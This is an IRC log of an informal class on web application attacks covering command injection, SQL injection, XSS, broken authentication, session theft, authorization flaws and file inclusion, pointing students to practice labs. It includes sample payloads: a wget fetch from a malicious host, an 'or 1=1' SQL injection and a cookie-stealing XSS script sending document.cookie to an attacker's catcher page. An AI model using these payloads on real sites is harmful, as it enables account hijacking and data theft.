<&kr0> Yea 
<&kr0> easier to format at the end
<&mona> don't tell me what to do!
<&rackham> so lets start with getting everybody on teh same page
<&rackham> does everybody know what a web application is?
< A_B_C> no :(
<&rackham> someone drop some knowledge on me
< RiseTheS33D> i dont know very well
<&rackham> wtf is a web app?
<&kr0> ur able to talk
< RiseTheS33D> i have some idea
< fsociety> site?
< fsociety> :P
< justforyou> joomla and wordpress
<&mona> it's an app
<&rackham> ^good examples
<&mona> ...on the web!!
< webanon> a dynamic site?
< webby> hey
< th1s> skripts?
<&kr0> WHAT IS A WEB APPLICATION (Web App)
< jhon> information 
< Qdr> some dynamic web page
< leet> Web Application, can't it also be someone's site with scripts?
<&rackham> alright
<&rackham> yes
<&rackham> it is anything more than a static HTML page...
<&rackham> defined as a "client-server software application which the client runs ina  web browser"
<&rackham> got it? 
<&rackham> awesome
<&rackham> kr0: 
<&kr0> It doesn't get any leeter then that
<&rackham> kick it off homie....Code/Command Injection
<&kr0> sooo
<&kr0> Imagine This
<&kr0> You got a Website 
<&kr0> a very shit website
<&kr0> and you want to execute YOUR PIECE OF CODE 
<&kr0> IN THEIR DATA STREAM
<&kr0> To get Information about the Website
<&kr0> Server/Admins etc.
<&kr0> sometimes its very easy
<&kr0> very very easy
<&kr0> Some Devs got a problem with the validation of User Input
<&kr0> Like Imagine a Search Box
<&kr0> | Search here... |
<&kr0> something like that
<&kr0> now , without any special tools or any skills
<&kr0> You could Insert something like 
<&kr0> | wget http://www.mymaliciousWebsite/bad.php |
<&kr0> If the Server is Supports the command wget
<&kr0> (Linux)
<&kr0> it will run the code and gets ur code onto the Website
<&mona> obviously this is a contrived example
<&kr0> It's called COMMAND INJECTION 
<&kr0> exactly
<&kr0> Its not THAT EASY
<&kr0> but you get the point
<&mona> yeah
<&kr0> Injecting anything 
<&mona> a lot of the "low-hanging" fruit vulns in webapps or injection or disclosure-related
<&mona> i.e. local file inclusion, sql injection, cross-site scripting
<&kr0> from Commands like 'cat /etc/passwd' over to just adding a ' 
<&kr0> everything can break the Apllication and let it run YOUR PIECE OF CODE
<&kr0> okay
<&kr0> related to that
<&kr0> The Famous SQL Injection
<&kr0> The concept behind that is very simple
<&kr0> If something (a Search Box , a Admin Panel)
<&kr0> is talking to a Database
<&kr0> and the Website (majority) is using SQL (Structured Query Language)
<&kr0> To Manage their Websites 
<&kr0> Its pretty related to Command Injection 
<&mona> SQL is a language that is used to ask a database for information to use in a webapp, for those who somehow don't know
<&kr0> ^
<&mona> it's not a programming language, it's just used to retrieve data from the db
<&kr0> So again 
<&kr0> YOUR CODE >>> Their Database / Data Stream 
<&kr0> Now 
<&kr0> for example 
<&kr0> http://shittywebsite.com/viewAccounts?id=1
<&kr0> you got this URL
<&kr0> It requests a parametername "viewAccounts" with the PARAMETER VALUE = 1
<&kr0> now 
<&kr0> if the code doesn't validate User Input correctly
<&kr0> it will run your code as well
<&rackham> what that is saying
<&rackham> is view accounts where the id is equal to '1'
<&mona> whenever you're performing any kind of injection
<&mona> the most important factor in your success or failure
<&mona> will be your ability to reconstruct the underlying query
<&mona> or code
<&mona> so you can inject the right stuff in
<&kr0> http://shittywebsite.com/viewAccounts?id=1' or '1'='1
<&mona> in this case, the sql query looks something like
<&mona> SELECT * FROM viewAccounts WHERE id=1
<&mona> SELECT * FROM viewAccounts WHERE id='1'* in this example i guess
<&kr0> pretty much
<&kr0> okay
<&kr0> http://shittywebsite.com/viewAccounts?id=1' or '1'='1
<&mona> SELECT * FROM viewAccounts WHERE id='1' or '1'='1' is what the query now looks like
<&mona> with that injection
<&kr0> would Inject your STATEMENT which is 1=1 WHICH IS TRUE
<&kr0> right ?
<&kr0> 1 = 1 .
<&kr0> Now 
<&kr0> Everyone knows that 1 = 1
<&kr0> BUT 
<&kr0> The Database should NOT TELL YOU
<&kr0> It takes YOUR CODE / STATEMENT
<&kr0> and executes it
<&kr0> which would in this cased
<&kr0> most likely show all entries in the Accounts Database
<&mona> you're telling the database "select every account where id=1, and every account where 1=1"
<&mona> since 1=1 all the time
<&mona> that means
<&mona> "show every account"
<&kr0> so every Account is displayed
<&kr0> with one simple 1=1
<&mona> this is the simplest example of sqli
<&kr0> right
<&mona> the one skids spam on every website they can find a parameter on
<&mona> sqli can get somewhat complex, and we'll cover that in more detail in a lesson later this week
<&rackham> alright
<&kr0> ok enough of me
<&rackham> number 2
<&rackham> in the top tizzle
<&rackham> Broken Authentication/Session Management
<&rackham> there isn't a whole lot to say about it
<&rackham> broken authentication
<&rackham> would be
<&rackham> no ssl
<&rackham> maybe a reset password changes passwords to a specific string
<&rackham> and its the same everytime
<&rackham> like the first 8 characters of the MD5 of the username or some dumb shit
<&rackham> or
<&rackham> the one that all of my fucking banks seem to implement
<&rackham> i reset password, it sends me my password in plaintext to my email
<&rackham> thats always a neat feature
<&rackham> another issue could be session IDs that don't time out or rotate 
<&rackham> you know when you post those sweet facebook selfies to #main
<&mona> for those who can't figure out why that's a problem: it means that someone who compromises your email account gets that password
<&rackham> and their is that random string
<&mona> and any other password transmitted in that way
<&rackham> there are session IDs in those links
<&rackham> so
<&rackham> besides the ability to track them by big brother
<&rackham> if they're implemented incorrectly
<&rackham> i could theoretically hijack your sessionid and log in as you...
<&rackham> it sounds really fuckin elementary but this shit happens
<&mona> very frequently
<&rackham> look at that bank that just got hit for the millions for sqli...sqli has been around forever
<&rackham> but anyway
<&rackham> that's the gist of broken auth and session ids...it really comes down to a shitty developer
<&rackham> that wants to roll his own and doesn't wtf they're going on about
<&mona> oh, on a semi-related note
<&rackham> kr0: want to do XSS and we can do some Q&A before moving on?
<&rackham> after mona rants :)
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&kr0> okay
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> unless you know exactly what you're fucking doing
<&kr0> QNA TIME
<&mona> DON'T ROLL YOUR OWN ENCRYPTION
<&mona> ok
<&mona> ^
< fsociety> do we need to master the SQL language to do proper SQLi? i suppose yes?
<&rackham> GO 
 * DLF what does rolling an own encryption mean ?
< A_B_C> do you love me
< SirAlexLix> it means making your own encryption system
<&mona> fsociety: yes
< TheDude> idk
<&mona> to be good
< anony721> could just use sqlmap
<&rackham> anony721: no
<&rackham> we dont do that here
< jhon> now days most of websites using countermeasure againts sqli even i have seen a website that doesnt take single column in login box?
<&mona> DLF: don't try to encrypt your shit with homemade code
<&rackham> we learn what sqlmap does before we use sqlmap
< SirAlexLix> SQLMAP is awesome, SQLI to full shell compromising. 
< katza> should i roll my own encryption
< DLF> ok
< justforyou> can you explain something about counting the columns? 
< SirAlexLix> no 
< webby> i think a better option will be sqlmap -u www.someshit.com/php?id=1
<&kr0> fsociety, SQL isn't really hard tho
< SirAlexLix> I mean I tried it, but its complex 
< RosaLux> so thats the way who some persons hacks on website the stores?
< TheDude> there are a lot of shitty developers out there because businesses tend to go with cheap not quality
< NullMind> so if i peform and 1 = 0 this gives more info but why?
< leet> to properly use sqli it woudl surely help, but manual sqli is quite simple to learn
<&kr0> I suggest w3schools.com
<&rackham> okay wait
<&rackham> lets catch up
<&rackham> first off
<&rackham> no sqlmap
<&rackham> we are here to teach what sqlmap does before we do sqlmap
<&mona> you dont need a lesson to use sqlmap
<&mona> a button and a motor
<&mona> can use sqlmap
<&rackham> justforyou: counting columns will be in the actual sqli lesson
<&mona> don't do something a vibrator could do for you, kids
<&mona> i guess i'm gonna need to expound upon encryption, too
<&mona> once upon a time, encryption
<&mona> was classed as munitions
<&mona> it was secret
<&mona> and disclosing it or having it was viewed as equivalent to possessing a weapon
<&mona> this is no longer the case
<&mona> the reason for that, is that closed source encryption does not work
<&mona> the reason we have strong encryption
<&mona> is because every encryption standard we have is constantly being hammered
<&mona> and tested
<&mona> and as soon as it gets broken, we throw it out
<&mona> when you try to write your own encryption, you throw all that out the window
<&mona> you can't write encryption no one can break, you can only write encryption YOU can't break
<&mona> </rant>
<&kr0> Is everything clear so far ?
< AnonClown> WOW I waited for this..... -_-.... 
< SirAlexLix> yes 
< NullMind> so AND 1 = 0 works right
< redevil> can we do wget from a sqli ?
< TheDude> u can only write encryption that will last for a while
< br0d4m> yeah
 * DLF mumbles
< AnonClown> mhhmmm
< jhon> now days most of websites using countermeasure againts sqli even i have seen a website that doesnt take single column in login box?how can we deal in this case ?please 
< SirAlexLix> yo can do --dump 
< SirAlexLix> with SQLI 
< webanon> getting clearer
< RosaLux> wait, what enrzption zou mean mona_
< webby> how can we do wget in sqli
< kashloca> is sqlmap is used only in blind sql injection or can be used in other variants
<&kr0> okay
<&kr0> NullMind, yes 
<&kr0> 1=0 would be False
<&kr0> it really depends what do want t accomplish
<&rackham> SirAlexLix: no you can't use --dump in sqli
<&rackham> because this isn't a sqlmap class
<&mona> as for "wget from sqli", that doesnt really make sense
<&rackham> take that shit to anonops
<&mona> if you're asking whether you can do an sqli with wget
<&mona> yes
<&mona> you'll just download the page
<&mona> with the erorr or whatever that your injection produced
<&rackham> NullMind: 1=0 works..that can be used as a type of filter evasion
<&mona> which is useful if you're automating for obvious reasons
<&rackham> if it is picking up 1=1, you could to 100 > 2
<&rackham> or 3000-2999 = 1
<&mona> and on that note, you always want to automate
<&rackham> we'll get into that during SQLi class
<&kr0> You could do instead of blabla?id=7
<&mona> the only sqli that you will find by plodding away putting ' on get params
<&kr0> blabla?id=(4+3) 
<&mona> are the skid shit
<&mona> that has been fucked bloody already
<&kr0> exactly
<&mona> automate your shit
<&kr0> SQLi is a Huge Topic
<&rackham> ^
<&kr0> not just adding a upperquote 
<&rackham> and i will have live examples for sqli if you dont throw sqlmap at them
<&kr0> right , so look forward to the SQLi Class 
<&mona> brb
<&kr0> Eveyrthing will be covered there , in Detail
<&rackham> whats up next? XSS?
<&kr0> yes
<&kr0> so 
<&kr0> NEXT  Huge Topic
<&rackham> another 4chan favorite
<&rackham> :)
<&kr0> XSS ( Cross - site - Scripting )
<&kr0> :D
<&kr0> Yea 
<&kr0> XSS can be very Simple 
<&kr0> but it also can be very difficult 
<&kr0> but what is XSS ?
<&kr0> XSS is nothing else then trying to GET YOUR CODE 
<&kr0> onto the Website 
<&kr0> XSS is another form of Command/Code Injection
<&kr0> XSS is very poupular these Days and a Community grown over the years
<&kr0> for example
<&kr0> You got a Search Box
<&kr0> | <b>Hello</b> |
<&kr0> and you instert this
<&kr0> insert*
<&kr0> The <b> Tag is HTML for Writing Bold , btw 
<&kr0> Now 
<&mona> xss is popular because it's common and easy to find, but it also gets a bad rep because it's client-side
<&kr0> Client side means , ITS "JUST" On your Site 
<&mona> yeah, you can't use xss to pwn a server directly
<&mona> but you CAN use it to inject code into a page
<&mona> that steals that admin's credentials
<&mona> and use THAT to pwn the server
<&kr0> cookie stealing , session highjacking , even phishing 
<&mona> it's kind of a cross between SE and hacking
<&kr0> alot of different ways can XSS pwn ur Ass
<&kr0> exactly
<&mona> if you're worried about xss pwning ur ass as kr0 says:
<&mona> noscript <3
<&kr0> Now , SQLi pretty much uses SQL
<&kr0> XSS would be Javascript (eww) and HTML 
<&kr0> and this is where NoScript appears 
<&kr0> NoScript is paranoid as fuck
<&kr0> It Blocks EVERY Piece of Javascript
<&kr0> and it even blocks XSS attempts 
<&kr0> NoScript is a Add On for Friefox btw
<&kr0> firefox*
<&kr0> so basically
<&kr0> Imagine you've a URL Like This 
<&kr0> http://bla.com/search=Porn
<&kr0> ^ This is a HTTP - GET Request , btw
<&kr0> You most likely seen this kind of URL before
<&kr0> now what a attacker does
<&kr0> http://bla.com/search=<script>alert(document.cookie)</script>
<&kr0> Laaaag , sry
<&kr0> now what this does
<&kr0> is pretty harmless , tbh 
<&mona> (kr0 is saying a HTTP get request is when the parameters are sent in the URL)
<&mona> (contrast with a HTTP post request, when a form or something in the webpage sends parameters)
<&mona> (both are injectable)
<&kr0> It implements a script which says basically : HEY BROWSER, I need a Pop up Box with the current Cookie
<&kr0> Cookies are great 
<&rackham> C IS FOR COOKIE
<&kr0> They "store" all of your authentication to a certain website 
<&mona> C is for credential theft
<&kr0> Which is great 
<&mona> cookies are a big part of why xss isn't pointless and is, in fact, a big deal
<&mona> you can have stateful http without them
<&mona> not reliably, anyway
<&kr0> Because without that you need to login each and every time you refresh the page 
<&mona> cant*
<&kr0> like Real cookies 
<&kr0> KEEP YOUR COOKIES FOR YOURSELF
<&kr0> a fat hacker would try to steal your cookie
<&kr0> which means all of your authentication to all your Website would belong to him 
<&rackham> and we all know of at least one fat hacker that will eat all the cookies
<&kr0> (There are counter measures from Websites like Banking Websites and Twitter / Fagbook) 
<&kr0> but 
<&kr0> you need to be aware of the risks
<&kr0> Now 
<&kr0> a Quick look on Types of XSS
<&kr0> pretty simple
<&kr0> There is Reflected 
<&kr0> and there is Stored
<&kr0> (some others as well)
<&kr0> Reflected would be that example above 
<&kr0> something like 
<&kr0> http://bla.com/search=<script>alert(document.cookie)</script>
<&kr0> The evil code gets send over to you
<&kr0> and there is Stored
<&kr0> some websites like to add Comment Sections 
<&kr0> or Guest Books 
<&kr0> something like that
<&kr0> maybe you getting what I'm refering here 
<&kr0> What if
<&kr0> The attacker types in his evil code INTO THE COMMENT SECTION ?
<&kr0> It gets STORED on the Website 
<&kr0> and EVERYONE 
<&kr0> who visits the website will run the evil code in Their Browser
<&kr0> Thats why XSS is Dangerous 
<&kr0> Its a huge risk
<&kr0> and should be prevented by URSELF
<&kr0> DON'T TRUST WEBSITES 
<&kr0> THEIR SHIT 
<&kr0> You need to be smarter then that 
<&kr0> Block Javascript 
<&kr0> and be aware of what you're typing 
<&kr0> and btw , use Encryption :>
<&kr0> okay
<&rackham> phew
<&kr0> XSS is a Huge Topic
<&rackham> that was heavy
<&mona> yeah
<&mona> me time?
<&rackham> im half scared to do this
<&rackham> wait mona 
<&kr0> there will be classes on that as well
<&mona> aight aight
<&rackham> since xss is huge, a real fast XSS BASED qa?
<&mona> OPEN THE GATES
<&rackham> first non-xss question its over
< Utilize> Does noscript (firefox addon) prevent XSS from running on your side?
< redevil> how bad can a reflected XSS be ?
< kill> autism
< katza> How does uMatrix fare compared to NoScript as far as XSS goes?
< nbd> <xmp>
<&mona> redevil: only diff between reflected and stored really
< A_B_C> again, do you love me
<&mona> is that stored affects every one who visits the page
< g0s5> are <you explaining or givin example how the "capured cookis or loging credentials" from an XXS which is only on cliend side will send to me (who implemented the XSS)?
<&mona> reflected only affects people who click that link
<&kr0> katza, everyzhing that blocks Javascript should be fine 
<&mona> so reflected requires you to phish or socially engineer
<&mona> whereas stored is a watering hole
<&mona> does that make sense?
< nbd> what about the chrome xss auditor
< torist> how would an attacker make XSS send the cookie info elsewhere?
< katza> kr0: ok
<&mona> nbd: there's always going to be XSS it misses
<&mona> whitelist > blacklist
<&mona> if you want to be secure
< redevil> mona, so i'll ask again then, how bad can a xss be ?
<&mona> redevil i just answered you motherfucker
<&kr0> g0s5, = something like that <script>document.location="http://website.com/cookie_catcher.php?c="+document.cookie</script> 
< cack> will this help me inject in to the bitcoin blockchain
<&mona> we already said what the scope of xss is
<&mona> you can steal credentials
<~butts> redevil: it depends on the setup and what kind of credentials you can gobble up
<&mona> you can redirect people to drive by downloads
<&mona> you control their browser
< nbd> so like if i xssed a wordpress i would just only be able to make posts to their blog?
<&mona> nbd: no, it doesnt' do anyhing to the server
<&kr0> g0s5, This will add the Cookie to a File on your Website 
<&mona> you'd be able to steal info from every user who visited that wordpress, potentially
< TheDude> remember to use what u learn wisely, 
<&mona> including the info on OTHER sites
< g0s5> THX @kr0 . bur where does it put the information and of get i access to it?
<&mona> that they're logged into
<&mona> (potentially0
<~butts> back in 2006 hackers were able to hijack almost 1million LiveJournal accounts utilizing an XSS attack
<~butts> cookies were harvested using a simple Flash video which was posted around large communities on LiveJournal
<&kr0> g0s5, in a file you refernce with a bit of php coding in the file "cookie_catcher.php"
<@anonymous> ppl think xss is only the little pop up that happens
<~butts> then the hackers amassed cookie credentials and were able to modify their own cookies with the harvested cookies, which logged them into the harvested users accounts
<~butts> this is one such attack that can be done
<&rackham> yes...xss pop-ups are used as a proof of concept
<&kr0> g0s5, reference on that is everyhwhere on the net 
<&rackham> in malicious use, that pop-up would not be there and the data would be sent to you rather than popped up on the victim's screen
<@anonymous> rackham:right, a way to test. butt xss can be devastating
<@anonymous> exactly
<&mona> butt xss is worst xss
<@anonymous> its not client side so not as popular
 * butts 
<&kr0> lol
<&rackham> alright mona you're up
<&mona> ok
<&mona> so
<&mona> web applications
<&mona> we went over the basic principles
<&mona> and we went over the 2 most common examples
<&mona> sqli, and xss
<&mona> both will be covered in more detail later in the week
<&mona> when we have time to do them justice
<&mona> now i'm going to go into more detail
<&mona> into the many ways you can break a web application
<&mona> so
<&mona> we mentioned authentication
<&mona> authentication is based on the "user privilege" model
<&mona> where the default privilege level is the anonymous user
<&mona> and hten you have between 1 and n levels above that
<&mona> i.e. normal user, admin, moderator, premium user
<&mona> and so on
<&mona> any defect in authentication
<&mona> can potentially grant you access you should not have
<&mona> things to look out for:
<&mona> username enumeration
<&mona> for example, on wordpress by default it is possible to enumerate usernames with a get parameter
<&mona> if you enter an id that exists, it gives you one type of error message
<&mona> if you enter an id that doesn't, you get another
<&mona> can passwords be guessed?
<&mona> that's very common
<&mona> even if your auth is rock solid, if it doesn't lock people out after a few attempts
<&mona> you can brute force all day
<&mona> likewise
<&mona> if there are default passwords
<&mona> or randomly generated predictable passwords
<&mona> i.e. when you reset password it's changed to "changeme"
<&mona> >reset pass
<&mona> >login with changeme
<&mona> and of course
<&mona> reel hax0ring
<&mona> looking for defects in the logic of the authentication mechanism itself
<&mona> if there's a "login success" page and a "please login" page,
<&mona> what happens if you just enter the URL of the login success page?
<&mona> i am not going to dox myself but if you're shaking your head here
<&mona> there is a certain brand of widely-used network device
<&mona> that may or may not be vulnerable to a 0day with that exact vulnerability
<&mona> no further comment on that.
<&mona> so
<@anonymous> <_<
<&mona> we touched on session management
<&rackham> mona droppin dem 0days
<&mona> i aint dropping shit
<&mona> <3
<@anonymous> drop it like its hawt, drap it likes its hawt
<&mona> authentication
<&mona> is about establishing you are an allowed user, right?
<&mona> but once you do that, you need to maintain state
<&mona> that's what session management is for
<&mona> in simple talk, it's a way to keep track of who is who
<&mona> if admin is logged in, the server needs to differentiate between requests from the admin's browser
<&mona> and request's from el33r hax0r thejester's browser
<&mona> as he hax0r's, el33tly
<&mona> as we said, cookies are the de facto way of managing sessions
<&mona> session management depends ENTIRELY on the security of its tokens
<&mona> so the most common way of breaking it is to steal the token
<&mona> if you have the token, you are the user
<&mona> if the tokens are not encrypted, you can sniff them on a local network
<&mona> often webapps will encrypt the password 
<&mona> but not the tokens later on
<&mona> likewise, xss as we were talking about earlier
<&mona> is a common way to steal tokens
<&mona> but as with auth, tokens can also be predictable
<&mona> if you generate tokens by taking the last token and adding 1 to it
<&mona> then you can login, get a token
<&mona> then increase it by 1 to get someone else's token
<&mona> then by 2
<&mona> and so on
<&mona> until you get an admin
<&mona> sounds like a pain, but what if you automate it?
<&mona> automation is key
<&mona> i'm not talking about skid shit here, i'm talking about finding 0days
<&mona> what a whitehat would call "vulnerability research"
<&mona> any q's b4 i continue?
< cack> autism
< TheDude> what about sites that do not have a "search box"?
< scareface> i am quite late
< justforyou> are tokens also in md5 encryption or
< redevil> and how can we automate things ?
< Namaste> now its rockin !
< NullMind> so is fuzzing part vulnerability research?
<@anonymous> one at atime
<&kr0> anything that talks to a Database TheDude 
<&mona> justforyou: a token can be an md5-hashed string, yes
< torc> what was actually happened in Myspace with "Samy is my hero"?
<&mona> NullMind: absolutely
<&kr0> any parameters 
< cack> where is the database where the tokens are stored, can we inject ourselves in and rob the db
<&mona> and it's an example of good automation
< justforyou> k mona
<&mona> we are having a lesson on that sometime soon
<@anonymous> TheDude: look for another input area, somewhere the application feeds data to the server
<&mona> cack: the tokens are not stored in the database, usually
< nbd> torc: http://samy.pl/popular/
<&mona> or rather
< webanon> so cookies are stored on my local, but tokens are stored in database?
<&mona> cookies = tokens
< nbd> mona: ??? yes they are, temporarily but still
< justforyou> cookies are local yes
<&mona> a cookie is a form of token
< nbd> if they werent stored in the database they wouldnt know who was who
<&mona> nbd well that's getting into semantics
<&mona> you're right, i mistyped
<&kr0> TheDude, Parameter passing like http://website.com/parametername?id=parametervalue 
<&mona> generally speaking though
<&mona> if you've compromised the database, you have more juicy info
< nbd> frankly if you have db access though things are much worse anyway
<@anonymous> Kr0:right
<&mona> tokens are usually stolen in transit
<&mona> or from the client
< justforyou> just did that cookie editing todat with that sql injection i was asking about 
<&mona> rather than from the server
< justforyou> but need it cracked lol
<&mona> redevil: lots of ways to automate things
<@anonymous> anywhere you can manipulate the data that is passed along to the server
<&mona> if you're automating web stuff
< Anon42213> but if you get the token you get the cooki owners identity?
<&mona> you'll need url-requesting libraries
<&mona> that make http requests
< CM99> does beef-xss help with token stealing ?
<&mona> and return the responses
< justforyou> if you get the cookie you are admin yes
<&mona> and then html parsing libraries to process them
<&mona> or in simple cases you can just use regexp
<&kr0> CM99, beef does alot more things then that 
<&mona> or write your own libraries
<&mona> beautifulsoup for python is a good xml/html parser
<&mona> justforyou: if you get the RIGHT cookie
<&kr0> Anon42213, pretty much , yes
< justforyou> yes mona lol i did id=1
<&mona> ok so let's continue to follow this chain of user management
<&mona> we have:
<&mona> authentication: are you X?
<&mona> session management: which browser was X, again?
<&mona> now the next step
<&mona> is authorization
<&mona> authorization: is X allowed to do this?
<&mona> as i said originally
<&mona> user management is all about managing privilege levels
<&mona> from anon, to regular user, to admin, to whatever
<&mona> let's say you have a homebrew website
<&mona> and there is an admin panel at /admin.php
<&mona> regular users can't get to it, because there is a little php script on index.php
<&mona> that only shows the button to the admin panel if you're logged in as an admin
<&mona> please tell me you guys are following along enough
<&mona> to see the problem
< webanon> yes
< nbd> yes
< g0s5> yep
< br0d4m> yeah
< Qdr> yeap
< Utilize> yes
< CyBeR_pHrEaK> yes
< CM99> yeah
< Uhrwerk> sure am
< scareface> not really
< scareface> am kinda lost
<&mona> the problem
<&mona> is that it's security through obscurity
<&mona> the only thing stopping a regular user from accessing the admin panel
<&mona> is that he doesn't get to see the button
<&mona> if he just adds /admin.php to the link
<&mona> he's an admin
<&mona> that's a simple example, but this kind o vulnerability is very common
<&mona> one place I see it a lot
<&mona> is in password reset functions
<&mona> you've have a password reset function that sends you an email
<&mona> and the email will have a link 
<&mona> site.com/?passwordReset=true&emailverified=true
<&mona> so what happens if you dont get an email
<&mona> and you just go to that link?
<&mona> web applications can get complicated
<&mona> there's a lot of things that developers think
<&mona> oh
<&mona> no one will ever see this debug function
<&mona> or this backdoor i wrote to make checking whether the add user code works
<&mona> etc etc
< justforyou> if (get_user_class() < UC_SYSOP)
< justforyou>  with the right cookie i get access
<&mona> there's a lot more classes of webapp vuln and a lot more to be said, and i intend to say it
<&mona> but first, some questions
<&mona> and then i'll let kr0 and rackham talk for  abit
 * mona needs a smoke
< justforyou> this does that 77a026c6108fb7472e5490bf8e5eb791
< nbd> you actually don't see this just in webapps
< justforyou> smoke some :D
< TheDude> passes mona a cig and a light
< nbd> http://www.theregister.co.uk/2016/05/09/allwinners_allloser_custom_kernel_has_a_nasty_root_backdoor/
<&mona> yes, a lot of these concepts are just vulnerability research in general, applied to the field of web application hacking
<&mona> stupid developers are a universal constant
<&rackham> okay
<&rackham> hope everybody is following along
<&rackham> i think mona covered a lot of it
<&rackham> a lot of web app vulns stem from some type of security misconfiguration
<@anonymous> speak up if you dont understand
<&rackham> yes, send all questions to anonymous ^
<&rackham> in PM
<&rackham> anyway
<@anonymous> -_-
<&rackham> security misconfigurations
<&rackham> i think a lot of the OWASP top 10 can fall under this
<&rackham> perfect example..did everybody see weev post the billboards
<&rackham> that marco rubio gay porn ended up on?
<&rackham> default credentials as admin:admin is misconfiguring security
<&rackham> or just throwing security right out the fucking window
<&rackham> sensitive data exposure...you know, maybe somebody fucked up permissions on their Wordpress
<&rackham> and are exposing their wp-config
<&rackham> or doing some of that OSINT magic mona and I talked about you can find some config files hanging out in the open
<&rackham> exposing passwords and IP addresses
<&rackham> finally
<&mona> no one would ever be stupid enough to use a password of admin:admin
<&mona> right, rackham?
<&rackham> never
<&rackham> ever
<&rackham> ever
<&rackham> never seen it
<&rackham> only in books
<&rackham> finally
<&rackham> one more attack vector
<&rackham> another 4chan favorite
<&rackham> LFI/RFI
<&rackham> which is suprisingly NOT on the OWASP Top 10
<&rackham> LFI (local file inclusion) and rfi (remote file inclusion) are file inclusion vulnerabilities
<&rackham> they allow attackers to include files on a web sever
<&rackham> leveraging LFI/RFI can range from outputting contents of a file 
<&rackham> to executing code
 * OnionIRC has quit (butthurt)
<&rackham> both server side and client side
<&rackham> which results in shells
<&rackham> DoS
<&rackham> i know you guys love that one
<&rackham> or theft of data/manipulating data
 * mona gets all teary-eyed at the mention of LFI
<&rackham> and i believe LFI/RFI can be touched on in another future class
<&rackham> because that can get a little heavy 
<&rackham> so
<&rackham> before i open this up for one last, final time
<&rackham> this week
<&rackham> SQLi, XSS, LFI/RFI
<&rackham> classes specifically on them
<&rackham> sunday will be more advanced web app stuff by @dan_crowley should be good stuff
<&rackham> go
< redevil> if I limit inclusion of files to a local folder. Can it still lead to LFI ?
< webanon> is there a dummy site we can test on?
< fsociety> i have seen admin:admin
< A_B_C> do you love me
<@anonymous> the dummy site is being figured out
< nbd> will there be classes on IoT? 
<&kr0> webanon, couple of them out there 
< justforyou> so many people do use admin:admin lol its not funny
< leet> fsociety: it was extreme sarcasm
< fsociety> leet :P
< Uhrwerk> is there going to be a transcript or text recording of this class put up somewhere?
<&rackham> a lot of people are asking for vulnerable test sites
<&kr0> redevil, depends on the Web App and how priviliges are given
<&rackham> vulnhub.com has a TON of vulnerable VMs
< Geek>  wnt class abt DOS...
<&rackham> metasploitable2 has like 3 differnt vuln web apps on them
